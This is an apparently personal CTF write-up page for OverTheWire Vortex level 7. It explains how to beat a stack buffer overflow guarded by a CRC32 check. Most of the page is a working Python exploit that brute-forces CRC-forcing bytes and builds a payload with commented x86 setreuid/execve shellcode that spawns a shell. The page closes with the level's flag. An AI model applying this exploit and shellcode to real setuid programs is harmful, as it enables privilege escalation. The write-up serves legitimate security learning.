<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=c4fe2f8b85b5cd33f4a88c9b430b87ece1dd468c">
    
<link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">

<!-- remove the cache headers -->
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">


<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>vortex7 | Avishai’s CTF Writeups</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="vortex7" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="…" />
<meta property="og:description" content="…" />
<link rel="canonical" href="http://localhost:4000/CTF_writeups/overthewire/vortex/vortex07.html" />
<meta property="og:url" content="http://localhost:4000/CTF_writeups/overthewire/vortex/vortex07.html" />
<meta property="og:site_name" content="Avishai’s CTF Writeups" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="vortex7" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"vortex7","url":"http://localhost:4000/CTF_writeups/overthewire/vortex/vortex07.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/CTF_writeups/">
          <h1>Avishai's CTF Writeups</h1>
        </a>
        <h2>...</h2>

        <section id="downloads">
          
          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <p>in this level we need to exploit buffer overflow. also, the CRC32 of the buffer needs to be <code class="language-plaintext highlighter-rouge">0xe1ca95ee</code></p>

<h4 id="calculate-the-crc">calculate the CRC</h4>
<ul>
  <li>
    <p>brute force
  we modify the CRC32 of the buffer by adding 4 bytes at the end, which gives us the ability to change the CRC32 to every possible value.</p>

    <p>i decided to go on brute force, however, calculating 2^32 can be very expensive, so i added some optimization by brute forcing only 3 bytes, and the last byte can be derived directly.
  now it is possible to calculate the CRC, it takes about 10 seconds.</p>
  </li>
  <li>
    <p>retrieve the CRC tables
  there are saved CRC tables which are stored in the memory, you need to achieve them and put them in the code.
  this is the command i used in radare2 <code class="language-plaintext highlighter-rouge">pxw 256*4 @obj.crc32_table</code>.
<img src="/CTF_writeups/overthewire/vortex/images/level7_1.png" alt="image" /></p>
  </li>
</ul>

<h4 id="build-the-payload">build the payload</h4>
<ul>
  <li>as we can see, we can’t just override the return address, we need to put in the esp something the will point to somewhere, this will be stored in ecx.
than, it will go 4 back and inside this memory, it’ll find the shellcode address.</li>
</ul>

<p><img src="/CTF_writeups/overthewire/vortex/images/level7_2.png" alt="image" /></p>

<p>we’ll put in ecx the address forward, and then in ebx and ebp the shellcode address.
<img src="/CTF_writeups/overthewire/vortex/images/level7_3.png" alt="image" /></p>

<p>also, you need to find the shellcode address, i put the shellcode in the buffer after @ebp+0x4, just debug and you’ll find.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">itertools</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p32</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">print</span> <span class="o">=</span> <span class="k">lambda</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">:</span> <span class="bp">None</span> <span class="c1"># override print function
</span>
<span class="c1"># desired CRC32
</span><span class="n">DESIRED_CRC</span> <span class="o">=</span> <span class="mh">0xe1ca95ee</span>

<span class="c1"># CRC-32 Table
</span><span class="n">CRC32_TABLE</span> <span class="o">=</span> <span class="p">(</span>
    <span class="mh">0x00000000</span><span class="p">,</span> <span class="mh">0x77073096</span><span class="p">,</span> <span class="mh">0xEE0E612C</span><span class="p">,</span> <span class="mh">0x990951BA</span><span class="p">,</span> <span class="mh">0x076DC419</span><span class="p">,</span> <span class="mh">0x706AF48F</span><span class="p">,</span> <span class="mh">0xE963A535</span><span class="p">,</span> <span class="mh">0x9E6495A3</span><span class="p">,</span>
    <span class="mh">0x0EDB8832</span><span class="p">,</span> <span class="mh">0x79DCB8A4</span><span class="p">,</span> <span class="mh">0xE0D5E91E</span><span class="p">,</span> <span class="mh">0x97D2D988</span><span class="p">,</span> <span class="mh">0x09B64C2B</span><span class="p">,</span> <span class="mh">0x7EB17CBD</span><span class="p">,</span> <span class="mh">0xE7B82D07</span><span class="p">,</span> <span class="mh">0x90BF1D91</span><span class="p">,</span>
    <span class="mh">0x1DB71064</span><span class="p">,</span> <span class="mh">0x6AB020F2</span><span class="p">,</span> <span class="mh">0xF3B97148</span><span class="p">,</span> <span class="mh">0x84BE41DE</span><span class="p">,</span> <span class="mh">0x1ADAD47D</span><span class="p">,</span> <span class="mh">0x6DDDE4EB</span><span class="p">,</span> <span class="mh">0xF4D4B551</span><span class="p">,</span> <span class="mh">0x83D385C7</span><span class="p">,</span>
    <span class="mh">0x136C9856</span><span class="p">,</span> <span class="mh">0x646BA8C0</span><span class="p">,</span> <span class="mh">0xFD62F97A</span><span class="p">,</span> <span class="mh">0x8A65C9EC</span><span class="p">,</span> <span class="mh">0x14015C4F</span><span class="p">,</span> <span class="mh">0x63066CD9</span><span class="p">,</span> <span class="mh">0xFA0F3D63</span><span class="p">,</span> <span class="mh">0x8D080DF5</span><span class="p">,</span>
    <span class="mh">0x3B6E20C8</span><span class="p">,</span> <span class="mh">0x4C69105E</span><span class="p">,</span> <span class="mh">0xD56041E4</span><span class="p">,</span> <span class="mh">0xA2677172</span><span class="p">,</span> <span class="mh">0x3C03E4D1</span><span class="p">,</span> <span class="mh">0x4B04D447</span><span class="p">,</span> <span class="mh">0xD20D85FD</span><span class="p">,</span> <span class="mh">0xA50AB56B</span><span class="p">,</span>
    <span class="mh">0x35B5A8FA</span><span class="p">,</span> <span class="mh">0x42B2986C</span><span class="p">,</span> <span class="mh">0xDBBBC9D6</span><span class="p">,</span> <span class="mh">0xACBCF940</span><span class="p">,</span> <span class="mh">0x32D86CE3</span><span class="p">,</span> <span class="mh">0x45DF5C75</span><span class="p">,</span> <span class="mh">0xDCD60DCF</span><span class="p">,</span> <span class="mh">0xABD13D59</span><span class="p">,</span>
    <span class="mh">0x26D930AC</span><span class="p">,</span> <span class="mh">0x51DE003A</span><span class="p">,</span> <span class="mh">0xC8D75180</span><span class="p">,</span> <span class="mh">0xBFD06116</span><span class="p">,</span> <span class="mh">0x21B4F4B5</span><span class="p">,</span> <span class="mh">0x56B3C423</span><span class="p">,</span> <span class="mh">0xCFBA9599</span><span class="p">,</span> <span class="mh">0xB8BDA50F</span><span class="p">,</span>
    <span class="mh">0x2802B89E</span><span class="p">,</span> <span class="mh">0x5F058808</span><span class="p">,</span> <span class="mh">0xC60CD9B2</span><span class="p">,</span> <span class="mh">0xB10BE924</span><span class="p">,</span> <span class="mh">0x2F6F7C87</span><span class="p">,</span> <span class="mh">0x58684C11</span><span class="p">,</span> <span class="mh">0xC1611DAB</span><span class="p">,</span> <span class="mh">0xB6662D3D</span><span class="p">,</span>
    <span class="mh">0x76DC4190</span><span class="p">,</span> <span class="mh">0x01DB7106</span><span class="p">,</span> <span class="mh">0x98D220BC</span><span class="p">,</span> <span class="mh">0xEFD5102A</span><span class="p">,</span> <span class="mh">0x71B18589</span><span class="p">,</span> <span class="mh">0x06B6B51F</span><span class="p">,</span> <span class="mh">0x9FBFE4A5</span><span class="p">,</span> <span class="mh">0xE8B8D433</span><span class="p">,</span>
    <span class="mh">0x7807C9A2</span><span class="p">,</span> <span class="mh">0x0F00F934</span><span class="p">,</span> <span class="mh">0x9609A88E</span><span class="p">,</span> <span class="mh">0xE10E9818</span><span class="p">,</span> <span class="mh">0x7F6A0DBB</span><span class="p">,</span> <span class="mh">0x086D3D2D</span><span class="p">,</span> <span class="mh">0x91646C97</span><span class="p">,</span> <span class="mh">0xE6635C01</span><span class="p">,</span>
    <span class="mh">0x6B6B51F4</span><span class="p">,</span> <span class="mh">0x1C6C6162</span><span class="p">,</span> <span class="mh">0x856530D8</span><span class="p">,</span> <span class="mh">0xF262004E</span><span class="p">,</span> <span class="mh">0x6C0695ED</span><span class="p">,</span> <span class="mh">0x1B01A57B</span><span class="p">,</span> <span class="mh">0x8208F4C1</span><span class="p">,</span> <span class="mh">0xF50FC457</span><span class="p">,</span>
    <span class="mh">0x65B0D9C6</span><span class="p">,</span> <span class="mh">0x12B7E950</span><span class="p">,</span> <span class="mh">0x8BBEB8EA</span><span class="p">,</span> <span class="mh">0xFCB9887C</span><span class="p">,</span> <span class="mh">0x62DD1DDF</span><span class="p">,</span> <span class="mh">0x15DA2D49</span><span class="p">,</span> <span class="mh">0x8CD37CF3</span><span class="p">,</span> <span class="mh">0xFBD44C65</span><span class="p">,</span>
    <span class="mh">0x4DB26158</span><span class="p">,</span> <span class="mh">0x3AB551CE</span><span class="p">,</span> <span class="mh">0xA3BC0074</span><span class="p">,</span> <span class="mh">0xD4BB30E2</span><span class="p">,</span> <span class="mh">0x4ADFA541</span><span class="p">,</span> <span class="mh">0x3DD895D7</span><span class="p">,</span> <span class="mh">0xA4D1C46D</span><span class="p">,</span> <span class="mh">0xD3D6F4FB</span><span class="p">,</span>
    <span class="mh">0x4369E96A</span><span class="p">,</span> <span class="mh">0x346ED9FC</span><span class="p">,</span> <span class="mh">0xAD678846</span><span class="p">,</span> <span class="mh">0xDA60B8D0</span><span class="p">,</span> <span class="mh">0x44042D73</span><span class="p">,</span> <span class="mh">0x33031DE5</span><span class="p">,</span> <span class="mh">0xAA0A4C5F</span><span class="p">,</span> <span class="mh">0xDD0D7CC9</span><span class="p">,</span>
    <span class="mh">0x5005713C</span><span class="p">,</span> <span class="mh">0x270241AA</span><span class="p">,</span> <span class="mh">0xBE0B1010</span><span class="p">,</span> <span class="mh">0xC90C2086</span><span class="p">,</span> <span class="mh">0x5768B525</span><span class="p">,</span> <span class="mh">0x206F85B3</span><span class="p">,</span> <span class="mh">0xB966D409</span><span class="p">,</span> <span class="mh">0xCE61E49F</span><span class="p">,</span>
    <span class="mh">0x5EDEF90E</span><span class="p">,</span> <span class="mh">0x29D9C998</span><span class="p">,</span> <span class="mh">0xB0D09822</span><span class="p">,</span> <span class="mh">0xC7D7A8B4</span><span class="p">,</span> <span class="mh">0x59B33D17</span><span class="p">,</span> <span class="mh">0x2EB40D81</span><span class="p">,</span> <span class="mh">0xB7BD5C3B</span><span class="p">,</span> <span class="mh">0xC0BA6CAD</span><span class="p">,</span>
    <span class="mh">0xEDB88320</span><span class="p">,</span> <span class="mh">0x9ABFB3B6</span><span class="p">,</span> <span class="mh">0x03B6E20C</span><span class="p">,</span> <span class="mh">0x74B1D29A</span><span class="p">,</span> <span class="mh">0xEAD54739</span><span class="p">,</span> <span class="mh">0x9DD277AF</span><span class="p">,</span> <span class="mh">0x04DB2615</span><span class="p">,</span> <span class="mh">0x73DC1683</span><span class="p">,</span>
    <span class="mh">0xE3630B12</span><span class="p">,</span> <span class="mh">0x94643B84</span><span class="p">,</span> <span class="mh">0x0D6D6A3E</span><span class="p">,</span> <span class="mh">0x7A6A5AA8</span><span class="p">,</span> <span class="mh">0xE40ECF0B</span><span class="p">,</span> <span class="mh">0x9309FF9D</span><span class="p">,</span> <span class="mh">0x0A00AE27</span><span class="p">,</span> <span class="mh">0x7D079EB1</span><span class="p">,</span>
    <span class="mh">0xF00F9344</span><span class="p">,</span> <span class="mh">0x8708A3D2</span><span class="p">,</span> <span class="mh">0x1E01F268</span><span class="p">,</span> <span class="mh">0x6906C2FE</span><span class="p">,</span> <span class="mh">0xF762575D</span><span class="p">,</span> <span class="mh">0x806567CB</span><span class="p">,</span> <span class="mh">0x196C3671</span><span class="p">,</span> <span class="mh">0x6E6B06E7</span><span class="p">,</span>
    <span class="mh">0xFED41B76</span><span class="p">,</span> <span class="mh">0x89D32BE0</span><span class="p">,</span> <span class="mh">0x10DA7A5A</span><span class="p">,</span> <span class="mh">0x67DD4ACC</span><span class="p">,</span> <span class="mh">0xF9B9DF6F</span><span class="p">,</span> <span class="mh">0x8EBEEFF9</span><span class="p">,</span> <span class="mh">0x17B7BE43</span><span class="p">,</span> <span class="mh">0x60B08ED5</span><span class="p">,</span>
    <span class="mh">0xD6D6A3E8</span><span class="p">,</span> <span class="mh">0xA1D1937E</span><span class="p">,</span> <span class="mh">0x38D8C2C4</span><span class="p">,</span> <span class="mh">0x4FDFF252</span><span class="p">,</span> <span class="mh">0xD1BB67F1</span><span class="p">,</span> <span class="mh">0xA6BC5767</span><span class="p">,</span> <span class="mh">0x3FB506DD</span><span class="p">,</span> <span class="mh">0x48B2364B</span><span class="p">,</span>
    <span class="mh">0xD80D2BDA</span><span class="p">,</span> <span class="mh">0xAF0A1B4C</span><span class="p">,</span> <span class="mh">0x36034AF6</span><span class="p">,</span> <span class="mh">0x41047A60</span><span class="p">,</span> <span class="mh">0xDF60EFC3</span><span class="p">,</span> <span class="mh">0xA867DF55</span><span class="p">,</span> <span class="mh">0x316E8EEF</span><span class="p">,</span> <span class="mh">0x4669BE79</span><span class="p">,</span>
    <span class="mh">0xCB61B38C</span><span class="p">,</span> <span class="mh">0xBC66831A</span><span class="p">,</span> <span class="mh">0x256FD2A0</span><span class="p">,</span> <span class="mh">0x5268E236</span><span class="p">,</span> <span class="mh">0xCC0C7795</span><span class="p">,</span> <span class="mh">0xBB0B4703</span><span class="p">,</span> <span class="mh">0x220216B9</span><span class="p">,</span> <span class="mh">0x5505262F</span><span class="p">,</span>
    <span class="mh">0xC5BA3BBE</span><span class="p">,</span> <span class="mh">0xB2BD0B28</span><span class="p">,</span> <span class="mh">0x2BB45A92</span><span class="p">,</span> <span class="mh">0x5CB36A04</span><span class="p">,</span> <span class="mh">0xC2D7FFA7</span><span class="p">,</span> <span class="mh">0xB5D0CF31</span><span class="p">,</span> <span class="mh">0x2CD99E8B</span><span class="p">,</span> <span class="mh">0x5BDEAE1D</span><span class="p">,</span>
    <span class="mh">0x9B64C2B0</span><span class="p">,</span> <span class="mh">0xEC63F226</span><span class="p">,</span> <span class="mh">0x756AA39C</span><span class="p">,</span> <span class="mh">0x026D930A</span><span class="p">,</span> <span class="mh">0x9C0906A9</span><span class="p">,</span> <span class="mh">0xEB0E363F</span><span class="p">,</span> <span class="mh">0x72076785</span><span class="p">,</span> <span class="mh">0x05005713</span><span class="p">,</span>
    <span class="mh">0x95BF4A82</span><span class="p">,</span> <span class="mh">0xE2B87A14</span><span class="p">,</span> <span class="mh">0x7BB12BAE</span><span class="p">,</span> <span class="mh">0x0CB61B38</span><span class="p">,</span> <span class="mh">0x92D28E9B</span><span class="p">,</span> <span class="mh">0xE5D5BE0D</span><span class="p">,</span> <span class="mh">0x7CDCEFB7</span><span class="p">,</span> <span class="mh">0x0BDBDF21</span><span class="p">,</span>
    <span class="mh">0x86D3D2D4</span><span class="p">,</span> <span class="mh">0xF1D4E242</span><span class="p">,</span> <span class="mh">0x68DDB3F8</span><span class="p">,</span> <span class="mh">0x1FDA836E</span><span class="p">,</span> <span class="mh">0x81BE16CD</span><span class="p">,</span> <span class="mh">0xF6B9265B</span><span class="p">,</span> <span class="mh">0x6FB077E1</span><span class="p">,</span> <span class="mh">0x18B74777</span><span class="p">,</span>
    <span class="mh">0x88085AE6</span><span class="p">,</span> <span class="mh">0xFF0F6A70</span><span class="p">,</span> <span class="mh">0x66063BCA</span><span class="p">,</span> <span class="mh">0x11010B5C</span><span class="p">,</span> <span class="mh">0x8F659EFF</span><span class="p">,</span> <span class="mh">0xF862AE69</span><span class="p">,</span> <span class="mh">0x616BFFD3</span><span class="p">,</span> <span class="mh">0x166CCF45</span><span class="p">,</span>
    <span class="mh">0xA00AE278</span><span class="p">,</span> <span class="mh">0xD70DD2EE</span><span class="p">,</span> <span class="mh">0x4E048354</span><span class="p">,</span> <span class="mh">0x3903B3C2</span><span class="p">,</span> <span class="mh">0xA7672661</span><span class="p">,</span> <span class="mh">0xD06016F7</span><span class="p">,</span> <span class="mh">0x4969474D</span><span class="p">,</span> <span class="mh">0x3E6E77DB</span><span class="p">,</span>
    <span class="mh">0xAED16A4A</span><span class="p">,</span> <span class="mh">0xD9D65ADC</span><span class="p">,</span> <span class="mh">0x40DF0B66</span><span class="p">,</span> <span class="mh">0x37D83BF0</span><span class="p">,</span> <span class="mh">0xA9BCAE53</span><span class="p">,</span> <span class="mh">0xDEBB9EC5</span><span class="p">,</span> <span class="mh">0x47B2CF7F</span><span class="p">,</span> <span class="mh">0x30B5FFE9</span><span class="p">,</span>
    <span class="mh">0xBDBDF21C</span><span class="p">,</span> <span class="mh">0xCABAC28A</span><span class="p">,</span> <span class="mh">0x53B39330</span><span class="p">,</span> <span class="mh">0x24B4A3A6</span><span class="p">,</span> <span class="mh">0xBAD03605</span><span class="p">,</span> <span class="mh">0xCDD70693</span><span class="p">,</span> <span class="mh">0x54DE5729</span><span class="p">,</span> <span class="mh">0x23D967BF</span><span class="p">,</span>
    <span class="mh">0xB3667A2E</span><span class="p">,</span> <span class="mh">0xC4614AB8</span><span class="p">,</span> <span class="mh">0x5D681B02</span><span class="p">,</span> <span class="mh">0x2A6F2B94</span><span class="p">,</span> <span class="mh">0xB40BBE37</span><span class="p">,</span> <span class="mh">0xC30C8EA1</span><span class="p">,</span> <span class="mh">0x5A05DF1B</span><span class="p">,</span> <span class="mh">0x2D02EF8D</span>
<span class="p">)</span>

<span class="k">def</span> <span class="nf">calculate_crc32</span><span class="p">(</span><span class="n">old_crc32</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
    <span class="s">"""Calculate the CRC-32 checksum of the input data."""</span>
    <span class="n">crc</span> <span class="o">=</span> <span class="n">old_crc32</span>
    <span class="k">for</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
        <span class="n">table_index</span> <span class="o">=</span> <span class="p">(</span><span class="n">crc</span> <span class="o">^</span> <span class="n">byte</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
        <span class="n">crc</span> <span class="o">=</span> <span class="p">(</span><span class="n">crc</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">^</span> <span class="n">CRC32_TABLE</span><span class="p">[</span><span class="n">table_index</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">crc</span> 


<span class="k">def</span> <span class="nf">calculate_magic_bytes</span><span class="p">(</span><span class="nb">buffer</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Brute-forcing started..."</span><span class="p">)</span>
    <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span>
    
    <span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">old_crc32</span> <span class="o">=</span> <span class="n">calculate_crc32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">buffer</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">guess</span> <span class="ow">in</span> <span class="n">itertools</span><span class="p">.</span><span class="n">product</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">),</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">3</span><span class="p">):</span>
        <span class="n">counter</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="n">almost_crc32</span> <span class="o">=</span> <span class="n">calculate_crc32</span><span class="p">(</span><span class="n">old_crc32</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">guess</span><span class="p">))</span>

        <span class="n">last_byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">almost_crc32</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="o">^</span> <span class="mi">75</span> <span class="c1"># CRC32_TABLE[75] = 0xE10E9818, which gives us MSB of 0xE1, the MSB of the desired
</span>        <span class="n">guess</span> <span class="o">=</span> <span class="n">guess</span> <span class="o">+</span> <span class="p">(</span><span class="n">last_byte</span><span class="p">,)</span>
        <span class="n">finished_crc32</span> <span class="o">=</span> <span class="p">(</span><span class="n">almost_crc32</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">^</span> <span class="n">CRC32_TABLE</span><span class="p">[</span><span class="mi">75</span><span class="p">]</span>
        
        <span class="k">if</span> <span class="n">finished_crc32</span> <span class="o">==</span> <span class="mh">0xe1ca95ee</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"guess is: </span><span class="se">\\</span><span class="si">{</span><span class="s">'</span><span class="se">\\</span><span class="s">'</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s">'x</span><span class="si">{</span><span class="n">byte</span><span class="si">:</span><span class="mi">02</span><span class="n">X</span><span class="si">}</span><span class="s">' for byte in guess)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
            <span class="k">break</span>
        <span class="k">if</span> <span class="n">counter</span> <span class="o">%</span> <span class="mi">1000000</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Checked </span><span class="si">{</span><span class="n">counter</span><span class="si">:</span><span class="p">,</span><span class="si">}</span><span class="s"> guesses"</span><span class="p">)</span>

    <span class="n">end</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Brute-forcing completed in </span><span class="si">{</span><span class="n">end</span> <span class="o">-</span> <span class="n">start</span><span class="si">}</span><span class="s"> seconds."</span><span class="p">)</span>

    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">guess</span><span class="p">)</span>


<span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x31</span><span class="s">"</span>  <span class="c1"># push 0x31 (49)
</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax
</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (geteuid())
</span>
    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xc3</span><span class="s">"</span>  <span class="c1"># mov ebx, eax (uid)
</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xd9</span><span class="s">"</span>  <span class="c1"># mov ecx, ebx
</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x46</span><span class="s">"</span>  <span class="c1"># push 0x46 (70)
</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax
</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80, setreuid(geteuid(), geteuid())
</span>
    <span class="sa">b</span><span class="s">"</span><span class="se">\x31\xd2</span><span class="s">"</span>  <span class="c1"># xor edx, edx
</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x52</span><span class="s">"</span>      <span class="c1"># push edx, which is \0
</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x68\x2f\x2f\x73\x68</span><span class="s">"</span>  <span class="c1"># push "//sh"
</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x68\x2f\x62\x69\x6e</span><span class="s">"</span>  <span class="c1"># push "/bin"
</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xe3</span><span class="s">"</span>  <span class="c1"># mov ebx, esp (now ebx contains: "/bin//sh",\x00)
</span>
    <span class="sa">b</span><span class="s">"</span><span class="se">\x52</span><span class="s">"</span>      <span class="c1"># push edx (push NULL into stack)
</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x53</span><span class="s">"</span>      <span class="c1"># push ebx (push pathname)
</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x89\xe1</span><span class="s">"</span>  <span class="c1"># mov ecx, esp (ecx is argv)
</span>
    <span class="sa">b</span><span class="s">"</span><span class="se">\xb0\x0b</span><span class="s">"</span>  <span class="c1"># mov al, 0x0b (11)
</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (execv("/bin//sh", argv))
</span>
        <span class="c1"># mv eax, 1         ; system call number (sys_exit)
</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x6a\x01</span><span class="s">"</span>  <span class="c1"># push 1
</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\x58</span><span class="s">"</span>      <span class="c1"># pop eax (sys_exit)
</span>    <span class="c1"># int 0x80
</span>    <span class="sa">b</span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span>  <span class="c1"># int 0x80 (exit())
</span><span class="p">)</span>

<span class="n">shellcode_address</span> <span class="o">=</span> <span class="mh">0xffffd290</span>

<span class="n">ecx_address</span> <span class="o">=</span> <span class="mh">0xffffd26c</span>
<span class="n">ebx_address</span> <span class="o">=</span> <span class="n">shellcode_address</span>
<span class="n">ebp_address</span> <span class="o">=</span> <span class="n">shellcode_address</span>


<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="mi">62</span> 

<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ecx_address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">ebx_address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">ebp_address</span><span class="p">)</span> 
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">shellcode_address</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x90</span><span class="s">'</span> <span class="o">*</span> <span class="mi">100</span> <span class="o">+</span> <span class="n">shellcode</span>

<span class="n">payload</span> <span class="o">+=</span> <span class="n">calculate_magic_bytes</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="c1"># if you already have the magic bytes, you can replace this line to save time
# payload += b'\x49\x3D\x99\x2F' 
</span>


<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

</code></pre></div></div>
<p>, all you need to change is <code class="language-plaintext highlighter-rouge">shellcode_address</code> and <code class="language-plaintext highlighter-rouge">ecx_address</code>.</p>

<p><img src="/CTF_writeups/overthewire/vortex/images/level7_4.png" alt="image" /></p>

<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">niEUGtu7f</code></em></strong></p>

      </section>
    </div>
  </body>
</html>
